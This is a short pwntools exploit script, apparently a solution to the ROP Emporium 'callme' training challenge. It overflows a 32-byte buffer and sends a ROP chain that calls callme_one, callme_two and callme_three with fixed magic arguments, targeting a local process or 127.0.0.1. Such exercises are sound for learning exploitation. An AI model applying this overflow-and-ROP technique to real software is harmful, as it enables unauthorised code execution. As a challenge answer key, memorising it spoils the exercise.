#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary = ELF('./callme')
context.bits = 64

libc = elf.libc
rop = ROP(elf)

gs = '''
b callme_one+6
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
r = start()

#============ exploit here ================

param_1 = 0xdeadbeefdeadbeef
param_2 = 0xcafebabecafebabe
param_3 = 0xd00df00dd00df00d


rop.callme_one(param_1, param_2, param_3)
rop.callme_two(param_1, param_2, param_3)
rop.callme_three(param_1, param_2, param_3)
#print(rop.dump())

payload = b'A'*32 # char buffer
payload += b'B'*8 # ebp
payload += p64(rop.ret.address)
payload += rop.chain() # rop


r.sendlineafter('>', payload)

#============= interactive ================

r.interactive()
